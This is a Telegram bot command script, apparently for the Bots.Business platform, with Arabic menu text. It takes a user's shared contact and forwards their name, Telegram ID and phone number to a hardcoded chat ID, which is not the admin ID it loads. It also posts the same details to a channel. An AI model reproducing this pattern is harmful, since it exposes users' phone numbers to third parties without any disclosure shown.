/*CMD
  command: send-contact
  help: 
  need_reply: false
  auto_retry_time: 
  folder: test
  answer: يرجى اختيار من القائمة بالاسفل
  keyboard: تسجيل شكوى, \n تسجيل اقتراح, \n,طلب نشر اعلان, \n عودة الى البداية 
  aliases: 
CMD*/

var line = "-----------------------------------"

Bot.sendMessage("شكرا لكم للموافقة على شروط الغروب")

let admin_phone_text = "<b>Phone Number From:</b> " +
    '<a href="' + 'tg://user?id=' + user.telegramid + '">' + user
    .first_name + '</a>' + ' <code>' + user.telegramid +
    '</code>' + " \n<b>" + line + " </b>\n" +
    "<b>Number:</b> <code>+" + options.phone_number +
    "</code>"

var ADMIN_ID = AdminPanel.getPanelValues("AdminInfo").ADMIN_ID;
var channel_name = AdminPanel.getPanelValues("Chanell").channel_name;

function sendMessage(chat_id, text){
    if(!chat_id){ return }
    Api.sendMessage({
        chat_id: chat_id,
        text: text,
        parse_mode: "html"
    }) 
}

//notifiy admin if any user entered phone number
sendMessage(874516231, admin_phone_text)

/*Save phone number in a channel*/
sendMessage(channel_name, admin_phone_text)
